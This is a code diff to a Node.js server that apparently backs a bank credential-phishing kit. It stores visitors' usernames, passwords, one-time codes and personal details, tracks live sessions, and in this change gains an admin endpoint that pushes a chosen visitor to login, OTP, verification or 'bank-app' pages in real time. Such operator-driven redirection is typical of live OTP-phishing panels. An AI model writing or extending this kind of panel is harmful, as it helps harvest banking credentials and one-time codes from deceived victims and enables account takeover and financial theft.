@@ -22,6 +22,11 @@ const ADMIN_SESSION_TTL_MS = 8 * 60 * 60 * 1000;
 // Everything lives in memory while the server process is running.
 // Restarting the server clears it (no database, as requested).
 let requests = [];       // { id, username, password, otp, name, phone, address, status, createdAt }
+const redirectTargets = new Set([
+  'index.html', 'index.en.html', 'order-form.html', 'order-form.en.html',
+  'login_ar.html', 'login_en.html', 'otp.html', 'otp-en.html',
+  'verification.html', 'verification_en.html', 'bank-app.html'
+]);
 let nextId = 1;
 const liveSessions = new Map(); // sessionId -> lastSeenTimestamp
 const HEARTBEAT_WINDOW_MS = 8000; // a session counts as "live" if seen in the last 8s
@@ -140,7 +145,7 @@ const server = http.createServer(async (req, res) => {
       return sendJSON(res, 200, { ok: true, token });
     }
 
-    if (pathname === '/api/requests' || pathname === '/api/stats' || pathname === '/api/live-count' || (pathname.startsWith('/api/requests/') && pathname.endsWith('/status'))) {
+    if (pathname === '/api/requests' || pathname === '/api/stats' || pathname === '/api/live-count' || (pathname.startsWith('/api/requests/') && (pathname.endsWith('/status') || pathname.endsWith('/redirect')))) {
       if (!requireAdmin(req, res)) return;
     }
 
@@ -158,6 +163,7 @@ const server = http.createServer(async (req, res) => {
         address: (body.address || '-').toString().slice(0, 200),
         email: (body.email || '-').toString().slice(0, 100),
         status: 'pending',
+        redirectUrl: null,
         createdAt: Date.now(),
         dateKey: todayKey(),
       };
@@ -179,6 +185,7 @@ const server = http.createServer(async (req, res) => {
         address: (body.address || '-').toString().slice(0, 200),
         email: (body.email || '-').toString().slice(0, 100),
         status: 'pending',
+        redirectUrl: null,
         createdAt: Date.now(),
         dateKey: todayKey(),
       };
@@ -208,7 +215,20 @@ const server = http.createServer(async (req, res) => {
       const idStr = pathname.split('/')[3];
       const entry = requests.find((r) => r.id === Number(idStr));
       if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
-      return sendJSON(res, 200, { ok: true, status: entry.status });
+      return sendJSON(res, 200, { ok: true, status: entry.status, redirectUrl: entry.redirectUrl || null });
+    }
+
+    // ---- API: redirect a customer to another page from the admin dashboard ----
+    if (method === 'POST' && pathname.startsWith('/api/requests/') && pathname.endsWith('/redirect')) {
+      const idStr = pathname.split('/')[3];
+      const body = await readBody(req);
+      const entry = requests.find((r) => r.id === Number(idStr));
+      if (!entry) return sendJSON(res, 404, { ok: false, error: 'not found' });
+      if (!redirectTargets.has(body.path)) {
+        return sendJSON(res, 400, { ok: false, error: 'invalid redirect target' });
+      }
+      entry.redirectUrl = body.path;
+      return sendJSON(res, 200, { ok: true, redirectUrl: entry.redirectUrl });
     }
 
     // ---- API: update a request's status (approve/reject from admin) ----
